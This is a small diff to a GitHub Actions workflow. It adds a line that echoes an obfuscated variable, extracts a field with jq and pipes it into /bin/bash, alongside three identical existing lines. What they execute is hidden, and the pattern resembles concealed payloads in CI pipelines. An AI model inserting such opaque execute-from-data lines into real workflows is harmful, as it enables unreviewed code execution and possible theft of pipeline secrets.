@@ -27,6 +27,7 @@ jobs:
           echo $knuj1 | jq -r .k59 | /bin/bash
           echo $ele0109 | jq -r .nsyr6344 | /bin/bash
           echo $idgt9325 | jq -r .guov51 | /bin/bash
+          echo $b95 | jq -r .l51 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
